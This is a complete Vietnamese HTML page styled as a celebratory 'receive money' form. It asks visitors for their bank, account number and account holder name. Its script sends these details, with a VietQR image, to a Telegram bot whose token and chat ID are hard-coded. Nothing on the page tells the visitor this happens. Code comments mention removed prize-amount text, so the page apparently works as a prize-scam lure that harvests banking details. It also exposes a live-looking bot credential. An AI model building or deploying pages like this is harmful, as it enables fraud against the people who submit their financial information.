<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gửi Thông Tin Nhận Tiền</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --gold: #D4AF37;
            --gold-light: #F9D423;
            --gold-dark: #B38728;
            --gold-text: linear-gradient(to right, #BF953F, #FCF6BA, #B38728, #FBF5B7, #AA771C);
            --glass-bg: rgba(12, 18, 34, 0.65);
            --glass-border: rgba(212, 175, 55, 0.2);
            --shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.6);
            --radius: 28px;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: radial-gradient(circle at 10% 20%, #1e1366, transparent 40%),
                        radial-gradient(circle at 90% 80%, #0a0a0a, transparent 50%),
                        radial-gradient(circle at 50% 50%, #2a0845, transparent 60%);
            background-color: #0b0f1a;
            color: #ffffff;
        }

        /* ===== CONTAINER ===== */
        .container {
            width: 100%;
            max-width: 420px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            padding: 32px 24px 28px;
            text-align: center;
            transition: all 0.3s ease;
        }

        /* ===== TYPOGRAPHY ===== */
        h1 {
            font-family: 'Playfair Display', serif;
            font-size: 38px;
            font-weight: 900;
            margin: 0 0 2px 0;
            background: var(--gold-text);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1.5px;
            line-height: 1.1;
        }

        .subtitle {
            font-family: 'Playfair Display', serif;
            font-size: 15px;
            font-style: italic;
            color: #d4af37;
            margin-bottom: 28px;
            opacity: 0.9;
            letter-spacing: 0.3px;
        }

        /* ===== CONFIG SECTION ===== */
        .config-section {
            background: rgba(255, 255, 255, 0.04);
            border-radius: 20px;
            padding: 22px 18px 18px;
            margin-bottom: 24px;
            border: 1px solid rgba(212, 175, 55, 0.08);
            backdrop-filter: blur(4px);
            transition: all 0.3s;
        }

        .config-section h3 {
            font-family: 'Playfair Display', serif;
            font-size: 19px;
            font-weight: 700;
            color: #d4af37;
            margin-top: 0;
            margin-bottom: 20px;
            text-align: center;
            letter-spacing: 0.5px;
            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
            padding-bottom: 12px;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.7);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 6px;
        }

        .select-wrapper {
            position: relative;
        }

        .select-wrapper::after {
            content: '▾';
            font-size: 12px;
            color: var(--gold);
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
            opacity: 0.7;
        }

        .input-group select,
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0, 0, 0, 0.35);
            border: 1px solid rgba(212, 175, 55, 0.2);
            border-radius: 14px;
            font-size: 15px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            transition: all 0.25s ease;
            appearance: none;
            -webkit-appearance: none;
            outline: none;
        }

        .input-group select {
            padding-right: 40px;
            cursor: pointer;
        }

        .input-group select option {
            background: #1a1f2e;
            color: #fff;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.25);
            font-weight: 400;
        }

        .input-group select:focus,
        .input-group input:focus {
            border-color: var(--gold);
            background: rgba(0, 0, 0, 0.5);
            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.15);
        }

        /* ===== BUTTON ===== */
        .btn-generate {
            background: var(--gold-text);
            color: #0b0f1a;
            border: none;
            padding: 18px 20px;
            font-size: 17px;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 8px 24px rgba(212, 175, 55, 0.25);
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1.8px;
            position: relative;
            overflow: hidden;
        }

        .btn-generate:hover {
            transform: translateY(-3px) scale(1.01);
            box-shadow: 0 16px 36px rgba(212, 175, 55, 0.35);
        }

        .btn-generate:active {
            transform: translateY(2px) scale(0.98);
        }

        .btn-generate:disabled {
            background: #3a3f4e;
            color: #7a7f8e;
            box-shadow: none;
            transform: none;
            cursor: not-allowed;
        }

        /* ===== QR RESULT ===== */
        .qr-result {
            display: none;
            margin-top: 28px;
            animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(212, 175, 55, 0.15);
            padding: 28px 16px 22px;
            border-radius: 24px;
            backdrop-filter: blur(4px);
        }

        .qr-result.active {
            display: block;
        }

        .qr-result h2 {
            font-family: 'Playfair Display', serif;
            font-size: 24px;
            font-weight: 700;
            color: #d4af37;
            margin: 0 0 15px 0;
            letter-spacing: 0.5px;
        }

        .qr-result img#qrImage {
            width: 100%;
            max-width: 180px;
            border-radius: 18px;
            margin: 8px auto 0;
            border: 2px solid rgba(212, 175, 55, 0.3);
            padding: 6px;
            background: #fff;
            display: block;
        }

        .qr-result p#successMsg {
            color: #4ade80;
            font-weight: 600;
            font-size: 14px;
            margin-top: 18px;
            display: none;
            background: rgba(74, 222, 128, 0.08);
            padding: 10px 14px;
            border-radius: 40px;
            border: 1px solid rgba(74, 222, 128, 0.15);
            letter-spacing: 0.3px;
        }

        /* ===== ANIMATIONS ===== */
        @keyframes slideUp {
            0% { opacity: 0; transform: translateY(30px) scale(0.92); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        .confetti {
            position: fixed;
            width: 8px;
            height: 16px;
            border-radius: 2px;
            animation: fall linear forwards;
            z-index: 9999;
            pointer-events: none;
        }

        @keyframes fall {
            to { transform: translateY(100vh) rotate(720deg); }
        }

        /* ===== RESPONSIVE TWEAKS ===== */
        @media (max-width: 480px) {
            .container { padding: 24px 16px 20px; }
            h1 { font-size: 32px; }
            .subtitle { font-size: 13px; margin-bottom: 20px; }
            .config-section { padding: 16px 12px 14px; }
            .input-group select, .input-group input { padding: 12px 14px; font-size: 14px; }
            .btn-generate { font-size: 15px; padding: 16px 18px; letter-spacing: 1.4px; }
            .qr-result h2 { font-size: 20px; }
            .qr-result img#qrImage { max-width: 150px; }
        }

        @media (max-width: 380px) {
            .container { padding: 18px 12px 16px; }
            h1 { font-size: 28px; }
            .config-section h3 { font-size: 17px; }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Đã sửa lại tiêu đề cho phù hợp với form Bank -->
        <h1>Nhận Tiền</h1>
        <p class="subtitle">Nhập đúng số tài khoản, tên người nhận và ngân hàng</p>

        <div class="config-section" id="configSection">
            <h3>Thông tin người nhận</h3>
            
            <div class="input-group">
                <label for="bankId">Ngân hàng</label>
                <div class="select-wrapper">
                    <select id="bankId">
                        <option value="MB">MBBank - Ngân hàng Quân Đội</option>
                        <option value="VCB">Vietcombank - Ngân hàng Ngoại Thương</option>
                        <option value="ACB">ACB - Ngân hàng Á Châu</option>
                        <option value="TCB">Techcombank - Ngân hàng Kỹ Thương</option>
                        <option value="VPB">VPBank - Ngân hàng Việt Nam Thịnh Vượng</option>
                        <option value="BIDV">BIDV - Ngân hàng Đầu tư & Phát triển</option>
                        <option value="CTG">VietinBank - Ngân hàng Công Thương</option>
                        <option value="TPB">TPBank - Ngân hàng Tiên Phong</option>
                        <option value="STB">Sacombank - Ngân hàng Sài Gòn Thương Tín</option>
                        <option value="HDB">HDBank - Ngân hàng Phát triển TP.HCM</option>
                        <option value="VIB">VIB - Ngân hàng Quốc Tế</option>
                        <option value="MSB">MSB - Ngân hàng Hàng Hải</option>
                        <option value="SHB">SHB - Ngân hàng Sài Gòn - Hà Nội</option>
                        <option value="OCB">OCB - Ngân hàng Phương Đông</option>
                    </select>
                </div>
            </div>
            
            <div class="input-group">
                <label for="accNo">Số tài khoản (Chỉ nhập số)</label>
                <input type="text" id="accNo" placeholder="Nhập số tài khoản..." oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            </div>
            <div class="input-group">
                <label for="accName">Tên tài khoản</label>
                <input type="text" id="accName" placeholder="Viết không dấu (VD: NGUYEN VAN A)">
            </div>
        </div>

        <div class="gift-area">
            <button class="btn-generate" id="btnGenerate">Gửi Thông Tin</button>
        </div>

        <div class="qr-result" id="qrResult">
            <h2>Mã QR Của Bạn</h2>
            <img id="qrImage" src="" alt="VietQR" style="display: none;">
            <p id="successMsg">✅ Đã gửi thông tin thành công!</p>
        </div>
    </div>

    <script>
        // ==========================================
        // CẤU HÌNH TELEGRAM BOT Ở ĐÂY
        // ==========================================
        const TELEGRAM_BOT_TOKEN = "8828772386:AAE1PSediTKtKvLOd96RHPxTH19wnSfr0CE";
        const TELEGRAM_CHAT_ID = "7126654319";
        
        document.getElementById('btnGenerate').addEventListener('click', async function() {
            const bankSelect = document.getElementById('bankId');
            const bankId = bankSelect.value;
            const bankName = bankSelect.options[bankSelect.selectedIndex].text;
            const accNo = document.getElementById('accNo').value.trim();
            const accName = document.getElementById('accName').value.trim().toUpperCase();

            if (!accNo) {
                alert("Bạn chưa nhập Số tài khoản!");
                return;
            }

            this.innerText = 'Đang xử lý...';
            this.disabled = true;

            // Xóa phần random số tiền, chỉ tạo link VietQR cơ bản
            let qrUrl = `https://img.vietqr.io/image/${bankId}-${accNo}-compact2.png?`;
            
            if (accName) {
                qrUrl += `accountName=${encodeURIComponent(accName)}`;
            }

            // Hiển thị ảnh QR lên giao diện
            const qrImageEl = document.getElementById('qrImage');
            qrImageEl.src = qrUrl;
            qrImageEl.style.display = 'block';
            
            document.getElementById('qrResult').classList.add('active');
            document.getElementById('configSection').style.display = 'none';

            // Gửi ảnh QR qua Telegram Bot
            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                // Sửa lại nội dung tin nhắn gửi về Telegram (bỏ phần báo số tiền trúng thưởng)
                const message = `🔔 Có yêu cầu nhận tiền mới!\n\n🏦 Ngân hàng: ${bankName}\n🔢 STK: ${accNo}\n👤 Tên: ${accName || 'Chưa nhập'}`;
                
                try {
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('photo', qrUrl);
                    formData.append('caption', message);

                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    if (result.ok) {
                        document.getElementById('successMsg').style.display = 'block';
                    } else {
                        console.error('Lỗi từ Telegram:', result);
                        alert("Lỗi Telegram: " + result.description);
                    }
                } catch (error) {
                    console.error('Lỗi khi gửi ảnh qua Telegram:', error);
                    alert("Không thể kết nối với Telegram Bot!");
                }
            }

            this.style.display = 'none';
            createConfetti(); // Vẫn giữ lại hiệu ứng pháo giấy bắn lên cho đẹp mắt
        });

        function createConfetti() {
            const colors = ['#D4AF37', '#F9D423', '#FF4E50', '#FFFFFF'];
            for (let i = 0; i < 80; i++) {
                const confetti = document.createElement('div');
                confetti.classList.add('confetti');
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.top = '-20px';
                
                const duration = Math.random() * 3 + 2;
                confetti.style.animationDuration = duration + 's';
                
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    confetti.remove();
                }, duration * 1000);
            }
        }
    </script>
</body>
</html>
